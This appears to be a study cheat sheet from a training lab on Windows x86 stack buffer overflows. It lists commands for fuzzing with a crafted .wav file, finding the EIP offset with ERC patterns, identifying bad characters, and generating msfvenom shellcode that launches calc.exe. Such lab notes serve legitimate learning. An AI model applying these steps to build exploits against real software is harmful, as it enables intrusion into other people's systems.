# buffer overflow Windows x86

## Take control EIP

- Get rough estimate offset
```shell
python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
```

- Create pattern
```shell
ERC --pattern c 5000
```

- Calculate exact offset
```shell
ERC --pattern o 1hF0
```

- Verify offset by overwriting EIP
```shell
$(python2 -c "print('A' * 1000 + 'B' * 4)")
```

## Identify bad chars

- Generate chars string

```shell
ERC --bytearray -bytes 0x00
```

- Compare characters from array to character in memory region, using the value of the ESP

```shell
ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

## Identify return address

## Generate shellcode

- Generate shellcode using `msfvenom`.
```shell
msfvenom -p windows/exec CMD='calc.exe' --format python --bad-chars "\x00"
```
